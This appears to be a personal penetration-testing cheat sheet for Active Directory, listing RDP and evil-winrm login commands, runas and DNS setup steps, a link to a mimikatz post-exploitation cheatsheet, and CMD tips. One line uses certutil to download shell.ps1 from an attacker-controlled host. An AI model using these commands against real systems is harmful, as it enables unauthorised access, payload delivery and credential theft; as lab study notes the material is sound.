# Active Directory


RDP to connect to jumphost: `xfreerdp /u:${DOMAIN}\\${user} /p:${password} /cert:ignore /v:$RHOST`
In order to add a shared drive with `xfreedrp`, use `/drive:tmp,/tmp`.

## evil-winrm

Connect to windows host via WinRM with (from kali)
```
evil-winrm -i ${RHOST} -u ${USER} -p ${PW}
```
special characters might need to be escaped from the password.

## Enumeration

### Initial setup

Set network connection credentials to given user on Windows with:
```
runas.exe /netonly /user:<domain>\<username> cmd.exe
```
Commands used for configuring DNS to the domain controller manually in PS:
```
$dnsip = "${DC_IP}"
$index = Get-NetAdapter -Name '${Network_Interface}' | Select-Object -ExpandProperty 'ifIndex'
Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip
```
`${Network_Interface}` is interface of the network


verify by using nslookup afterwards.


## Post Exploit

[mimikatz cheatsheet](https://kashz.gitbook.io/kashz-jewels/cheatsheet/mimikatz)


## CMD commands to remember

CMD equivalent of wget
```
certutil.exe -urlcache -split -f http://{ATTACKER_IP}:{ATTACKER_PORT}/shell.ps1
```

grep equivalent for cmd: `findstr`

remove a file with force: `del /f`

